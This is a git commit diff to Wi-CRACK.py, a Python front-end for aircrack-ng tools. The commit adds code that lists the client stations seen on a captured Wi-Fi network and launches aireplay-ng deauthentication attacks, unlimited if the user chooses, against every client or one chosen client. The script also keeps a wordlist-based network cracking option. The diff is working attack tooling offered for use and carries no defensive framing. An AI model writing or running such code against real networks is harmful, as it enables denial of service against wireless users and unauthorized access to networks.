2956d2cbba712ff0ad5d51e9cfea18ac49dc36db
ANIKET BHAGWATE <aniketbhagwate@gmail.com>
2020-03-16 02:41:33 +0530

    Update Wi-CRACK.py

--- Wi-CRACK.py
+++ Wi-CRACK.py
@@ -19,18 +19,24 @@ os.system("mkdir DUMP 1> error.txt 2> error.txt ")
 os.system("rm -rf error.txt")
 
 banner='''
-     ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||	
-     |	__        _____       ____ ____      _    ____ _  __  |  
-     |	\ \      / /_ _|     / ___|  _ \    / \  / ___| |/ /  |   
-     |	 \ \ /\ / / | |_____| |   | |_) |  / _ \| |   | ' /   | 
-     |	  \ V  V /  | |_____| |___|  _ <  / ___ \ |___| . \   |    
-     |	   \_/\_/  |___|     \____|_| \_\/_/   \_\____|_|\_\  |   						          
-     ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+ ==========================================================================
+ ==========================================================================
+
+  __________      __        _____       ____ ____      _    ____ _  __
+  \ \ \ \ \ \     \ \      / /_ _|     / ___|  _ \    / \  / ___| |/ / 
+   \ \ \ \ \ \     \ \ /\ / / | |_____| |   | |_) |  / _ \| |   | ' / 
+   / / / / / /      \ V  V /  | |_____| |___|  _ <  / ___ \ |___| . \ 
+  /_/_/_/_/_/        \_/\_/  |___|     \____|_| \_\/_/   \_\____|_|\_\ 
+  
+ ==========================================================================
+ 		CODED BY : NullByte007 ~ Aniket Bhagwate 
+ ==========================================================================
+     
 '''
 
 def bann():
 	os.system("clear")
-	print(banner)
+	print("\033[32;40m"+banner+"\033[m")
 
 
 MonMode=''
@@ -82,7 +88,7 @@ def Airodump():
 	print("[!] CAPTURING ALL WIRELESS NETWORKS ")	
 	print("=======================================")
 	os.system("airodump-ng {} -w DUMP/output_wifi --write-interval 5 -o csv ".format(MonMode))
-	
+	bann()
 	#metadata = input(" [◽] COPY AND PASTE ALL THE ABOVE DATA HERE ==> ")	
 	'''
 	for x in f:
@@ -112,7 +118,7 @@ def extractBSSID():
 	'''
 	
 	
-	print("-----------------------\n[*] CAPTURED NETWORKS\n-----------------------")
+	print("\033[32;40m -----------------------\n[*] CAPTURED NETWORKS\n----------------------- \033[m")
 	try:
 		for x in f:
 			cnt+=1
@@ -130,21 +136,29 @@ def extractBSSID():
 	
 	
 def SpecificAirodump(bssid,channel,monitor,essid):
-	print("\nSELECTED NETWORK : ==> \033[30;42m {} \033[m".format(essid))
+	print("\n[*] GETTING CONNECTED HOSTS FOR SELECTED NETWORK : ==> \033[30;42m {} \033[m".format(essid))
+	print("[!] PRESS <CTRL + C> AFTER SOME INTERVAL TO GET RESULTS ! ")
 	input("\n< PRESS ENTER >")
-	os.system("airodump-ng --bssid {} --channel {} {}".format(bssid,channel,monitor))
+	os.system("airodump-ng --bssid {} --channel {} --write DUMP/output --output-format csv --write-interval 3 {}".format(bssid,channel,monitor))
+	bann()
+	print("\033[32;40")
 	
-	print("|======================================|")
-	print("| SELECT CHOICE  : ")
-	print("| [1] INITIATE DEAUTHENTICATION ATTACK ") 
-	print("| [2] CRACK WIRELESS NETWORK")
-	print("|======================================|")
-	choice = input() 
+	print("==========================================================")
+	print(" 	   	     SELECT CHOICE	       	         ")
+	print("==========================================================")
+	print(" [1] INITIATE DEAUTHENTICATION ATTACK [KICK OUT HOSTS !]  ") 
+	print("==========================================================")
+	print(" [2] CRACK WIRELESS NETWORK				  ")				  
+	print("==========================================================")
+	
+	choice = input()  
 	
 	if choice=='1':
-		Infinite_Aireplay(bssid,monitor)
+		bann()
+		Infinite_Aireplay(bssid,monitor,essid)
 		
 	elif choice=='2':
+		bann()
 		wordlist = input("[?] ENTER (NAME / PATH) TO WORDLIST : ")
 		try:
 			f = open(wordlist,'r')
@@ -163,11 +177,38 @@ def SpecificAirodump(bssid,channel,monitor,essid):
 		bye(monitor)
 
 
-def Infinite_Aireplay(bssid,monitor):
-	packets = input("[*] ENTER NO OF DE-AUTH PACKETS TO SEND : [default: 0 ~ Unlimited packets] => ")
-	os.system("aireplay-ng --deauth {} -a {} {}".format(packets,bssid,monitor))
+def Infinite_Aireplay(bssid,monitor,essid):
+	f = open("DUMP/output-01.csv",'r')
+	f = f.read().split("\n")
+	f.remove(f[0])
+	f.pop()
+	f.pop()
+	new_index = f.index('')+2
+	stations = f[new_index:] 
+	cnt=0
+	print("\n[*] SHOWING ALL CONNECTED STATIONS FOR : \033[30;42m " +  "{}".format(essid) + "\033[m" + "\n")
+	for x in stations:
+		cnt +=1
+		x = x.split(",")
+		x.pop()
+		print("====================================================================================================================================")
+		print("[ {} ] STATION : \033[30;42m ".format(cnt) + x[0] + " \033[m | BSSID : \033[30;42m" +x[5]+ " \033[m" + "\n")
+	
+	choice = int(input("[?] SELECT THE HOST YOU WANT TO KICK OUT ~~ OR [TYPE '0' FOR ALL] :"))
+	
+	if choice==0:
+		packets = input("\n[*] ENTER NO OF DE-AUTH PACKETS TO SEND : [default: 0 ~ Unlimited packets] => ")
+		input("\n [!] YOU CAN PRESS <CTRL + C> ANY TIME TO CLOSE DEAUTHENTICATION ! ")
+		os.system("aireplay-ng --deauth {} -a {} {}".format(packets,bssid,monitor))
+		bye(monitor)
+	else:
+		packets = input("\n[*] ENTER NO OF DE-AUTH PACKETS TO SEND : [default: 0 ~ Unlimited packets] => ")	
+		input("\n [!] YOU CAN PRESS <CTRL + C> ANY TIME TO CLOSE DEAUTHENTICATION ! ")
+		os.system("aireplay-ng --deauth {} -a {} -c {} {}".format(packets,bssid,stations[choice-1].split(",")[0],monitor))
+		bye(monitor)
+		
 
-
+	# GET THE STATION ADDRESS : stations[choice-1].split(",")[0]
 
 def bye(monitor):
 	os.system("airmon-ng stop {} 2> DUMP/error.txt 1> DUMP/error.txt".format(monitor))
@@ -178,18 +219,13 @@ def bye(monitor):
 	
 	
 def main():
+	print("\033[32;40m")
 	print(banner)
 	MonitorMode()
 	Airodump()
 	extractBSSID()
-
+	print("\033[m")
 
 if __name__=='__main__':
 	main()
-
-
-
-
-
-
 
